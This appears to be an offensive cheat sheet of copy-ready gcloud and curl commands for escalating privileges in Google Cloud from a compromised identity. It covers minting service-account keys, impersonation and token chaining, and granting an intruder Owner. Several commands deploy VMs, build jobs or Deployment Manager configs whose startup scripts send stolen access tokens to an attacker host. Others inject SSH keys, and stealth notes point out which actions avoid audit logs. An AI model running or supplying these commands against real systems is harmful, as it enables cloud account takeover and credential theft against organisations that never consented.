# GCP privilege-escalation methods — exact CLI

Placeholders: project `example-prj`, org `123456789012`, victim SA
`deploy-sa@example-prj.iam.gserviceaccount.com`, attacker host `203.0.113.7`.
Run as the compromised identity (`gcloud auth activate-service-account
--key-file=sa.json`, or user creds). Verify with `gcloud auth list` and
`gcloud projects get-iam-policy example-prj`. All admin writes hit Cloud Audit
Logs; data-plane reads often don't.

Find your own permissions first (no IAM read needed):

```
# testIamPermissions is self-answerable:
gcloud projects list
gcloud asset search-all-iam-policies --scope=projects/example-prj   # if cloudasset viewer
# brute-force your permission set: POST testIamPermissions with candidate perms
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/example-prj:testIamPermissions" \
  -d '{"permissions":["resourcemanager.projects.setIamPolicy","iam.serviceAccountKeys.create","iam.serviceAccounts.actAs"]}'
```

## 1. iam.serviceAccountKeys.create — mint a key for any SA

```
gcloud iam service-accounts list --project example-prj
gcloud iam service-accounts keys create /tmp/sa.json \
    --iam-account deploy-sa@example-prj.iam.gserviceaccount.com
gcloud auth activate-service-account --key-file=/tmp/sa.json
gcloud projects get-iam-policy example-prj   # what does the SA hold?
```
Durable (keys don't expire). 10-key limit per SA.

## 2. iam.serviceAccounts.getAccessToken — direct impersonation

```
gcloud auth print-access-token \
    --impersonate-service-account=deploy-sa@example-prj.iam.gserviceaccount.com
# use everywhere:
gcloud compute instances list --project example-prj \
    --impersonate-service-account=deploy-sa@example-prj.iam.gserviceaccount.com
# REST:
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/deploy-sa@example-prj.iam.gserviceaccount.com:generateAccessToken" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'
```
Quietest method; 1h tokens, renew at will (`roles/iam.serviceAccountTokenCreator`).

## 3. iam.serviceAccounts.signJwt / signBlob — self-signed tokens

```
# signJwt: build an OAuth assertion and exchange it for an access token
NOW=$(date +%s); EXP=$((NOW+3600))
JWT_PAYLOAD=$(printf '{"iss":"deploy-sa@example-prj.iam.gserviceaccount.com","sub":"deploy-sa@example-prj.iam.gserviceaccount.com","aud":"https://oauth2.googleapis.com/token","iat":%d,"exp":%d,"scope":"https://www.googleapis.com/auth/cloud-platform"}' $NOW $EXP)
SIGNED=$(curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/deploy-sa@example-prj.iam.gserviceaccount.com:signJwt" \
  -H "Content-Type: application/json" -d "{\"payload\": $(printf '%s' "$JWT_PAYLOAD" | python3 -c 'import json,sys;print(json.dumps(sys.stdin.read()))')}" \
  | python3 -c 'import json,sys;print(json.load(sys.stdin)["signedJwt"])')
curl -s -X POST https://oauth2.googleapis.com/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$SIGNED"
```
`signBlob` similarly signs arbitrary bytes (forge GCS signed URLs, etc.).

## 4. iam.serviceAccounts.implicitDelegation — SA→SA chains

If SA-A has `iam.serviceAccounts.implicitDelegation` on SA-B, and SA-B has
TokenCreator on SA-C, chain through the `delegates` field:

```
curl -s -X POST -H "Authorization: Bearer <token-as-SA-A>" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa-c@example-prj.iam.gserviceaccount.com:generateAccessToken" \
  -H "Content-Type: application/json" \
  -d '{"delegates":["projects/-/serviceAccounts/sa-b@example-prj.iam.gserviceaccount.com"],
       "scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'
```

## 5. resourcemanager.projects.setIamPolicy (and org/folder variants) — self-grant

```
gcloud projects add-iam-policy-binding example-prj \
    --member user:intruder@example.com --role roles/owner
# or for a SA you control:
gcloud projects add-iam-policy-binding example-prj \
    --member serviceAccount:ours@example-prj.iam.gserviceaccount.com --role roles/owner
# org level (resourcemanager.organizations.setIamPolicy):
gcloud organizations add-iam-policy-binding 123456789012 \
    --member user:intruder@example.com --role roles/resourcemanager.organizationAdmin
```
`add-iam-policy-binding` does get-modify-set for you — never hand-write the
full policy or you'll strip existing bindings (loud and destructive).
Resource-level setIamPolicy variants work identically: buckets
(`gsutil iam ch user:intruder@example.com:admin gs://corp-data` /
`gcloud storage buckets add-iam-policy-binding`), SAs
(`gcloud iam service-accounts add-iam-policy-binding deploy-sa@... --member ... --role roles/iam.serviceAccountTokenCreator` — grant yourself impersonation!),
KMS keys, BigQuery datasets.

## 6. actAs + deploy compute — become the attached SA

All need `iam.serviceAccounts.actAs` on the target SA plus the service's create
permission. The workload reads its token from the metadata server.

**Compute Engine** (`compute.instances.create`):

```
gcloud compute instances create sync --zone us-central1-a --machine-type e2-micro \
  --service-account deploy-sa@example-prj.iam.gserviceaccount.com \
  --scopes cloud-platform \
  --metadata startup-script='curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | curl -sX POST -d @- http://203.0.113.7/c'
```
Always pass `--scopes cloud-platform` — legacy scopes cap the token even when
the SA is Owner.

**Cloud Functions** (`cloudfunctions.functions.create` + actAs):

```
mkdir /tmp/f && cat > /tmp/f/main.py <<'EOF'
import requests
def h(request):
    t = requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                     headers={"Metadata-Flavor":"Google"}).text
    return t
EOF
echo requests > /tmp/f/requirements.txt
gcloud functions deploy sync --region us-central1 --runtime python312 \
  --trigger-http --allow-unauthenticated --entry-point h --source /tmp/f \
  --service-account deploy-sa@example-prj.iam.gserviceaccount.com
curl -s https://us-central1-example-prj.cloudfunctions.net/sync
```

**Cloud Run** (`run.services.create` + actAs): same idea,
`gcloud run deploy sync --image <token-echo image> --service-account deploy-sa@... --allow-unauthenticated --region us-central1`.

**Cloud Build** (`cloudbuild.builds.create`): builds run as the Cloud Build SA
(`<prj-num>@cloudbuild.gserviceaccount.com`, frequently Editor) — *no actAs
needed* for the default:

```
cat > /tmp/cb.yaml <<'EOF'
steps:
- name: gcr.io/cloud-builders/curl
  entrypoint: bash
  args: ['-c', 'curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | curl -sX POST -d @- http://203.0.113.7/c']
EOF
gcloud builds submit --no-source --config /tmp/cb.yaml --project example-prj
```

## 7. deploymentmanager.deployments.create — run as the DM default SA

Deployment Manager executes as `<prj-num>@cloudservices.gserviceaccount.com`
(Editor by default). Create any resource Editor can — e.g. a VM with the
token-exfil startup script from §6 — without holding compute perms yourself:

```
cat > /tmp/dm.yaml <<'EOF'
resources:
- name: sync
  type: compute.v1.instance
  properties:
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/e2-micro
    disks: [{boot: true, initializeParams: {sourceImage: projects/debian-cloud/global/images/family/debian-12}, autoDelete: true}]
    networkInterfaces: [{network: global/networks/default, accessConfigs: [{type: ONE_TO_ONE_NAT}]}]
    serviceAccounts: [{email: deploy-sa@example-prj.iam.gserviceaccount.com, scopes: ["https://www.googleapis.com/auth/cloud-platform"]}]
    metadata: {items: [{key: startup-script, value: "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | curl -sX POST -d @- http://203.0.113.7/c"}]}
EOF
gcloud deployment-manager deployments create sync --config /tmp/dm.yaml
```

## 8. compute metadata / OS Login — shell into an instance with a strong SA

`compute.instances.setMetadata` (instance) or
`compute.projects.setCommonInstanceMetadata` (project-wide SSH key injection):

```
ssh-keygen -t ed25519 -f /tmp/k -N '' -C intruder
gcloud compute instances add-metadata app-vm01 --zone us-central1-a \
  --metadata ssh-keys="intruder:$(cat /tmp/k.pub)"
ssh -i /tmp/k intruder@198.51.100.23
# on-box:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

OS Login path: `roles/compute.osLogin` / `osAdminLogin` (root) +
`gcloud compute ssh app-vm01 --zone us-central1-a`; or
`compute.instances.osLogin` perms via
`gcloud compute os-login ssh-keys add --key-file /tmp/k.pub`.
If project metadata has `enable-oslogin=TRUE`, metadata ssh-keys are ignored —
check `gcloud compute project-info describe`.

## Verification & looping

```
gcloud auth list
gcloud projects get-iam-policy example-prj \
  --flatten="bindings[].members" --filter="bindings.members:deploy-sa@" \
  --format="value(bindings.role)"
```
Each SA key/token loops back into `cloud-credential-enumeration`; re-enumerate
(testIamPermissions sweep) as the new identity, then climb again — SA chains in
GCP commonly go 2–4 hops to Owner.
